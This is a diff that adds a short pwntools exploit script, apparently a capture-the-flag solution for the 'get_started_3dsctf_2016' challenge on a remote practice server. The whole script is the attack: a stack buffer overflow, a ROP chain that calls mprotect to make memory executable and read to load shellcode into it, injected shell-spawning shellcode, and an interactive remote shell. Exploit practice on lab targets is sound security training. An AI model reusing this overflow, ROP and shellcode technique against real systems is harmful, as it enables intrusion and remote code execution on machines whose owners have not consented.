@@ -1,0 +1,13 @@
+from pwn import *
+p=remote("node4.buuoj.cn",28721)
+elf=ELF('./get_started_3dsctf_2016')
+mprt_addr=elf.sym['mprotect']
+read_addr=elf.sym['read']
+addr=0x8048000
+pop3_ret=0x080509a5
+payload=b'a'*(0x38)+p32(mprt_addr)+p32(pop3_ret)+p32(addr)+p32(0x1000)+p32(0x7)
+payload+=p32(read_addr)+p32(pop3_ret)+p32(0x0)+p32(addr)+p32(0x100)+p32(addr)
+p.sendline(payload)
+payload2=asm(shellcraft.sh())
+p.sendline(payload2)
+p.interactive()
